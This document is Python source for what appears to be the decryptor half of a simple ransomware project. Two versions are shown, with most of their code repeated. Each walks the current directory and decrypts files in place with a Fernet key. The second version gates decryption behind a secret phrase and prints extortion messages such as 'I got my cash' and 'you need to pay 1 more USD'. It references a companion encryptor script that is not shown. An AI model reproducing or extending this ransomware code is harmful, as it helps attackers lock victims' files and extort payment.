#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
        if file == "ransome.py" or file == "thekey.key" or file == "decrypt.py":
                continue
        if os.path.isfile(file):
                files.append(file)

print(files)


with open("thekey.key", "rb") as key:
        secretkey = key.read()


for file in files:
        with open(file, "rb") as thefile:
                contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
                thefile.write(contents_decrypted)


#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
        if file == "ransome.py" or file == "thekey.key" or file == "decrypt.py":
                continue
        if os.path.isfile(file):
                files.append(file)

print(files)


with open("thekey.key", "rb") as key:
        secretkey = key.read()
secretphrase = "openme"

user_phrase = input("Enter the secret phrase to decrypt your files\n")

if user_phrase == secretphrase:
        for file in files:
                with open(file, "rb") as thefile:
                        contents = thefile.read()
                contents_decrypted = Fernet(secretkey).decrypt(contents)
                with open(file, "wb") as thefile:
                        thefile.write(contents_decrypted)
        print("congrats, you got your files, I got my cash")
else:
        print("Sorry, wrong secretphrase, you need to pay 1 more USD")